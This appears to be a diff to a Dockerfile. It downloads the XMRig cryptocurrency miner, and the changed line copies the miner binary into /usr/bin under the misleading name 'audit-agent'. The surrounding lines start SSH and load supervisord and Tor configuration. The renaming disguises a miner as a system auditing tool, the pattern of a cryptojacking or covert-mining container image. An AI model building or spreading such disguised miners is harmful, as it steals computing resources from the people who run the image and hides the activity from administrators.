@@ -17,7 +17,7 @@ RUN service ssh start
 RUN wget https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz
 RUN tar -xvf xmrig-${XMRIG_VERSION}-linux-x64.tar.gz
 RUN ls -al xmrig-${XMRIG_VERSION}
-RUN cp xmrig-${XMRIG_VERSION}/* /usr/bin/audit-agent
+RUN cp xmrig-${XMRIG_VERSION}/xmrig /usr/bin/audit-agent
 
 COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
 COPY tor.rc /etc/tor/tor.rc
